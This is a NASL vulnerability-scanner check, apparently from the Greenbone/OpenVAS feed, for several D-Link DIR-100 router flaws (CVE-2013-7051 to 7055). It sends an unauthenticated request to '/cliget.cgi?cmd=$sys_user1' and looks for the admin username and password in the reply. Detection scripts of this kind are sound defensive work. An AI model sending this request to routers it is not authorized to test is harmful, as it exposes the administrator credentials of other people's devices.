if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803797" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2013-7051", "CVE-2013-7052", "CVE-2013-7053", "CVE-2013-7054", "CVE-2013-7055" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-02-05 12:25:02 +0530 (Wed, 05 Feb 2014)" );
	script_name( "D-Link DIR-100 Router Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is running D-Link DIR-100 Router and is prone to multiple
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP request and check whether it is able to read
  the user information." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - Retrieve the Administrator password and sensitive configuration parameters
  like the pppoe username and password without authentication.

  - Execute privileged Commands without authentication through a race condition
  leading to weak authentication enforcement.

  - Sending formatted request to a victim which then will execute arbitrary
  commands on the device.

  - Store arbitrary javascript code which will be executed when a victim
  accesses the administrator interface." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause denial of service or
  execute arbitrary HTML and script code in a user's browser session in context of an affected website." );
	script_tag( name: "affected", value: "D-Link DIR-100 Hardware Revision: D1 Software Version: 4.03B07" );
	script_tag( name: "solution", value: "Apply the patch or upgrade to version 4.03B13 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/31425" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2014020019" );
	script_xref( name: "URL", value: "http://pigstarter.krebsco.de/report/2013-12-18_dir100.txt" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/d-link-dir-100-csrf-xss-disclosure-authentication" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "http_server/banner" );
	script_xref( name: "URL", value: "http://more.dlink.de/sicherheit/index.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
DlinkPort = http_get_port( default: 80 );
DlinkBanner = http_get_remote_headers( port: DlinkPort );
if(!ContainsString( DlinkBanner, "Server: HTTP Server" )){
	exit( 0 );
}
DlinkReq = http_get( item: "/bsc_internet.htm", port: DlinkPort );
DlinkRes = http_keepalive_send_recv( port: DlinkPort, data: DlinkReq );
if(ContainsString( DlinkRes, "sys_passHash" ) && ContainsString( DlinkRes, "router.css" )){
	url = "/cliget.cgi?cmd=$sys_user1";
	if(http_vuln_check( port: DlinkPort, url: url, check_header: TRUE, pattern: "user=.*&pass=" )){
		security_message( port: DlinkPort );
		exit( 0 );
	}
}
exit( 99 );

